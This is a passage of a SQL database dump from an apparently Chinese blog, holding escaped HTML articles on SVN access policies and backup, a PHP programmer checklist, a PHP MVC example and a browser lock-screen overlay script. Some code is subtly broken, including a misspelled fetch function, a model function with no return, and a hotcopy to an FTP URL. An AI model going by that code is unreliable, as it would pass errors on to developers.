/>\r\n&nbsp;&nbsp;&nbsp; &lt;LimitExcept GET PROPFIND OPTIONS REPORT&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Require valid-user&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/LimitExcept&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/Location&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如果再增加个策略文件，<span style=\"color:#FF0000\">（一个用户对所有子仓库里的项目权限都是不一样的。）</span>修改为：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;Location /svn&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; DAV svn&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; SVNParentPath D:/svn/reponsitory&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthzSVNAccessFile d:/passwd/policy&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthType Basic&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthName &quot;Subversion Reponsitory&quot;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthUserFile d:/test/passwords&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Require valid-user&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/Location&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>编写策略文件内容d:/passwd/policy:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [subresponsitory:/]&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; user1=rw&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; user2=r&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; user3= &nbsp;</p>\r\n\r\n<p><span style=\"color:#FF0000\">subresponsitory:/表示子仓库subresponsitory下所有的项目</span></p>\r\n\r\n<p><span style=\"color:#FF0000\">如果某个子仓库没有在策略文件里配置，那么默认是所有用户都没有权限访问</span></p>\r\n\r\n<p>用户组</p>\r\n\r\n<p>策略文件里修改为：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [groups]&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; developers=user1,user2&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; testers=user3 &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; #testers=@developers,user3也可以&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [subsvn:/]&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; @developers=rw &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; @testers=&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; #这里也可以继续添加用户比如 user4=r &nbsp;</p>\r\n\r\n<p><br />\r\n备份：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; svnadmin hotcopy d:/svn/reponsitory d:/backup&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; svnadmin hotcopy d:/svn/reponsitory ftp://11.222.11.2&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; #reponsitory下的内容拷贝到backup目录下，reponsitory本身不会被拷贝</p>\r\n',0,1429365031,0,0),(11,10,'四十条测试你是不是合格的PHP程序员','<p>四十条测试你是否合格的PHP程序员,不官方，也不权威，但很给力。超过三条就不合格了。超过五条就得好好反省下自己的不足了。2011我来了~<br />\r\n1. 不会利用如phpDoc这样的工具来恰当地注释你的代码<br />\r\n2. 对优秀的集成开发环境如 EclipsePHP EPP 或 Zend Studio PDT视而不见<br />\r\n3. 从未用过任何形式的版本控制系统，如Subclipse<br />\r\n4. 不采用某种编码与命名标准，以及通用约定，不能在项目开发周期里贯彻落实<br />\r\n5. 不使用统一开发方式<br />\r\n6. 不转换(或)也不验证某些输入或SQL查询串(译注：参考PHP相关函数)<br />\r\n7. 不在编码之前彻底规划你的程序<br />\r\n8. 不使用测试驱动开发<br />\r\n9. 不在错误开启状态下进行编码和测试(译注：参考PHP函数error_reporting)<br />\r\n10. 对调试器的好处视而不见<br />\r\n11. 不重构你的代码<br />\r\n12. 不使用类似MVC模式把程序的不同层次划分开<br />\r\n13. 不知道这些概念：KISS, DRY, MVC, OOP, REST<br />\r\n14. 不用return而是直接在你的函数或类中输出(echo/print)内容<br />\r\n15. 对单元测试或通用测试的优点视而不见<br />\r\n16. 总是返回硬编码的HTML，却不返回纯粹的数据，字符串，或对象<br />\r\n17. 总是对&ldquo;消息&rdquo;和&ldquo;配置参数&rdquo;进行硬编码<br />\r\n18. 不对SQL查询语句做优化<br />\r\n19. 不使用__autoload(译注：参考PHP手册相关描述)<br />\r\n20. 不允许智能错误处理(译注：参考PEAR的ErrorStack)<br />\r\n21. 使用$_GET替代$_POST来做具有破坏性的传递操作<br />\r\n22. 不知道怎么利用正则表达式<br />\r\n23. 从未听说过SQL注入或跨站脚本<br />\r\n24. 不允许简易配置，也不允许类的构造函数接受参数传递而后执行set/get方法，或运行时的常量定义<br />\r\n25. 不理解面向对象编程(OOP)的优势和劣势<br />\r\n26. 不视情形大小而滥用OOP<br />\r\n27. 自认为实现可复用的软件一定等于/需要让你的代码遵循OOP<br />\r\n28. 不利用智能缺省值<br />\r\n29. 没有单一的配置文件<br />\r\n30. 不想暴露文件源码，却用.inc后缀名取代了.php<br />\r\n31. 不使用数据库抽象层<br />\r\n32. 不能保持DRY作风，即不重复自己，如果你总是在复制粘贴一些东西，说明你设计得很差劲<br />\r\n33. 没有实现让一个函数/类/方法只做一件事，也不能组合利用它们<br />\r\n34. 没能尝试OOP的特长，如抽象类、接口、多态、继承，访问控制修饰符(译注：如public, private, protected)<br />\r\n35. 不用现有的设计模式优化你的程序体系设计<br />\r\n36. 不允许你的用户在你拥有很多文件或目录的情况下定义基础目录<br />\r\n37. 污染了名称空间，比如用常见字符串命名你的库函数<br />\r\n38. 使用数据库表时不使用表前缀<br />\r\n39. 不使用统一的模板引擎<br />\r\n40. 不关注已有的PHP开发框架，懒于探索;其实先进的开发理念和美妙代码就蕴含其中。</p>\r\n',0,1429425490,0,0),(12,12,'一个简单的MVC模式例子','<p>为了更好的展示MVC是如何工作的，我们使用一个简单的新闻发布系统作为例子来说明，其中一个系统使用了MVC模式，另一个没有使用。<br />\r\n要从数据库中获取一系列的新闻文章并显示，最基本的方法就是创建一个php脚本连接至一个数据库，查询这个数据库，然后循环处理结果，并输出对应的各文章的HTML。<br />\r\n以下的代码显示了这样一个脚本：<br />\r\n&lt;?php<br />\r\nmysql_connect(...);<br />\r\n$result = mysql_query(&quot;select * from news order by article_date desc&quot;);<br />\r\n?&gt;<br />\r\n&lt;html&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;/body&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h1&gt;New Article&lt;/h1&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;?php while($row = mysql_fetch_object($result)){ ?&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h2&gt;&lt;?php echo $row-&gt;headline; ?&gt;&lt;/h2&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;p&gt;&lt;?php echo $row-&gt;body; ?&gt;&lt;/p&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;?php } ?&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;/body&gt;<br />\r\n&lt;/html&gt;<br />\r\n诸如这样的脚本存在一个问题：很难维护。因为php代码和html代码，连接数据库代码和前台代码混在一起。<br />\r\n现在考虑使用MVC模式实现这个代码。这里最主要的是做两个重大的改变，首先是把从数据库获取文件的代码转移到一个可以重用的组件中（php类或者函数）。然后调用这<br />\r\n个新函数来获取文章，从而可以使用html来输出。按照MVC的术语来讲，这个新的php类或者函数就是模型（M）。<br />\r\n第二个重大的改变就是将获取文章的调用与与具体的html分离。尽管这个改变不像第一个那么的意义重大，但是它也是很重要的，因为这样一来，就可以修改html代码而不<br />\r\n必担心html中使用的数据是如何生成的。用MVC的术语来讲，这就是将控制器（C）和视图（V）分离。<br />\r\n采用MVC模式之后，将建立三个文件。模型为：<br />\r\n&lt;?php<br />\r\nfunction get_articles()<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;mysql_connect();<br />\r\n&nbsp;&nbsp; &nbsp;$result = mysql_query(&quot;select * from news order by article_date desc&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;$articles = array();<br />\r\n&nbsp;&nbsp; &nbsp;while($row = mysql_fetch_objects($result)){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$articles[] = $row;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\n?&gt;<br />\r\n控制器为：<br />\r\n&lt;?php<br />\r\n$articles = get_articles();<br />\r\ndisplay_template(&quot;articles.tpl&quot;);<br />\r\n?&gt;<br />\r\n视图如下：<br />\r\n&lt;html&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;body&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h1&gt;News Articles&lt;/h1&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;?php foreach($articles as $row) { ?&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h2&gt;&lt;?php echo $row-&gt;headline; ?&gt;&lt;/h2&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;p&gt;&lt;?php echo $row-&gt;body; ?&gt; &lt;/p&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;?php } ?&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n',0,1429427618,0,0),(13,13,'html锁屏代码','<p>前不久有个正要毕业的网友给我发邮件，他毕业设计需要实现锁屏的效果，但是他没有能看懂我之前发布的对话框源码，他问能不能把锁屏相关代码说明下，我当时说过两天就发。由于最近比较忙，我现在才想起来，但愿现在此文还来得及。</p>\r\n\r\n<p>步入正题：<br />\r\n现在全屏的半透明遮罩层在web2.0网站应用非常广泛了，绝大多数遮罩是通过计算页面大小，然后覆盖一个与页面同等大小的层实现，如腾讯qzone， wordpress后台。这种方式本来无可非议，但是在页面很长的时候在IE8下会失效（国外资料的解释是与机器显卡相关），有些完美情节的同学遇到这个问题后就抓破了头，无奈之下甚至想让IE8强制使用IE7的方式解析他的作品。其实我们有一个更好的方法，咱们用CSS去解决它！</p>\r\n\r\n<p>还记得&ldquo;position:fixed&rdquo;吗？它是css2的一个新增的属性，他可以让一个元素静止在页面上，拖动滚动条也不会动，如Qzone顶部固定的导航栏就是这样实现的。同样我们也可以用一个100%高宽的层覆盖浏览器视口，这样就可以实现全屏遮罩了，不用再计算页面的大小，调整浏览器大小的时候也不要去动态修改尺寸了。</p>\r\n\r\n<p>以下为引用的内容：<br />\r\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />\r\n&lt;title&gt;lock page&lt;/title&gt;<br />\r\n&lt;meta name=&quot;author&quot; content=&quot;www.planeart.cn&quot; /&gt;<br />\r\n&lt;style&gt;<br />\r\n#pageOverlay { position:fixed; top:0; left:0; z-index:1987; width:100%; height:100%; background:#000; filter:alpha(opacity=70); opacity:0.7; }<br />\r\n&lt;/style&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;ol id=&quot;test&quot; onclick=&quot;document.getElementById(&#39;pageOverlay&#39;).style.visibility = &#39;visible&#39;&quot;&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;/ol&gt;<br />\r\n&lt;div id=&quot;pageOverlay&quot; onclick=&quot;this.style.visibility = &#39;hidden&#39;&quot;&gt;&lt;/div&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n\r\n<p>可是有一个头疼的问题，IE6不支持&ldquo;position:fixed&rdquo;，咱们只能通过js动态的修改它的TOP值以模拟静止定位，拖动滚动条的时候遮罩成肯定会抖动，因为每改变一次IE会重新渲染一次。但是微软却给我们提供了一个非常有趣的特性，如果给html或者body标签设置一个静止定位的背景图片，层在拖动滚动条的时候就不会抖动了，几乎完美的模拟了&ldquo;position:fixed&rdquo;。我在实际项目中发现这个特性他还能触发其他的特异功能，以后再说明。</p>\r\n\r\n<p>为了省事，咱们针对IE6用万恶expression在CSS中写点脚本，拖动滚动条的时候重新定位我们的遮罩层。传说中expression是非常耗性能的，可是咱们的expression几乎没有损耗，有兴趣的同学可以深入研究下expression。</p>\r\n\r\n<p>以下为引用的内容：</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />\r\n&lt;title&gt;lock page&lt;/title&gt;<br />\r\n&lt;meta name=&quot;author&quot; content=&quot;www.planeart.cn&quot; /&gt;<br />\r\n&lt;style&gt;<br />\r\n#pageOverlay { position:fixed; top:0; left:0; z-index:1987; width:100%; height:100%; background:#000; filter:alpha(opacity=70); opacity:0.7; }<br />\r\n/*IE6 fixed*/<br />\r\n* html { background:url(*) fixed; }<br />\r\n* html body { margin:0; height:100%; }<br />\r\n* html #pageOverlay { position: absolute; left: expression(documentElement.scrollLeft + documentElement.clientWidth - this.offsetWidth); top: expression(documentElement.scrollTop + documentElement.clientHeight - this.offsetHeight); }<br />\r\n&lt;/style&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;ol id=&quot;test&quot; onclick=&quot;document.getElementById(&#39;pageOverlay&#39;).style.visibility = &#39;visible&#39;&quot;&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;li&gt;蓝色幻想&lt;/li&gt;<br />\r\n&lt;/ol&gt;<br />\r\n&lt;div id=&quot;pageOverlay&quot; onclick=&quot;this.style.visibility = &#39;hidden&#39;&quot;&gt;&lt;/div&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n\r\n<p>好了，兼容IE6这个大头娃娃后，咱们的锁屏遮罩已经通杀主流浏览器了，但是呢用js写效果的同学们总是非常的蛋疼，总想折腾点什么来，咱们就再添加一点脚本，让锁屏的时候后可以中断用户操作，把滚动条、滚轮、tab键、全选、刷新、右键统统禁止掉，模拟真正的&lsquo;锁屏&rsquo;：</p>\r\n\r\n<p>以下为引用的内容：</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />\r\n&lt;title&gt;lock page&lt;/title&gt;<br />\r\n&lt;meta name=&quot;author&quot; content=&quot;www.planeart.cn&quot; /&gt;<br />\r\n&lt;style&gt;<br />\r\n#pageOverlay { visibility:hidden; position:fixed; top:0; left:0; z-index:1987; width:100%; height:100%; background:#000; filter:alpha(opacity=70); opacity:0.7; }<br />\r\n/*IE6 fixed*/<br />\r\n* html { background:url(*) fixed; }<br />\r\n* html body { margin:0; height:100%; }<br />\r\n* html #pageOverlay { position: absolute; left: expression(documentElement.scrollLeft + documentElement.clientWidth - this.offsetWidth); top: expression(documentElement.scrollTop + documentElement.clientHeight - this.offsetHeight); }<br />\r\n&lt;/style&gt;<br />\r\n&lt;script&gt;<br />\r\n(function(){<br />\r\n&nbsp;&nbsp; &nbsp;// 获取对象<br />\r\n&nbsp;&nbsp; &nbsp;var $ = function (id){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return document.getElementById(id);<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;// 遍历<br />\r\n&nbsp;&nbsp; &nbsp;var each = function(a, b) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for (var i = 0, len = a.length; i &lt; len; i++) b(a[i], i);<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;// 事件绑定<br />\r\n&nbsp;&nbsp; &nbsp;var bind = function (obj, type, fn) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (obj.attachEvent) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj[&#39;e&#39; + type + fn] = fn;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj[type + fn] = function(){obj[&#39;e&#39; + type + fn](window.event);}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj.attachEvent(&#39;on&#39; + type, obj[type + fn]);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} else {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj.addEventListener(type, fn, false);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;};<br />\r\n&nbsp;&nbsp; &nbsp;// 移除事件<br />\r\n&nbsp;&nbsp; &nbsp;var unbind = function (obj, type, fn) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (obj.detachEvent) {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try {<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj.detachEvent(&#39;on&#39; + type, obj[type + fn]);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;obj[type + fn] = null;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} catch(_) {};<br 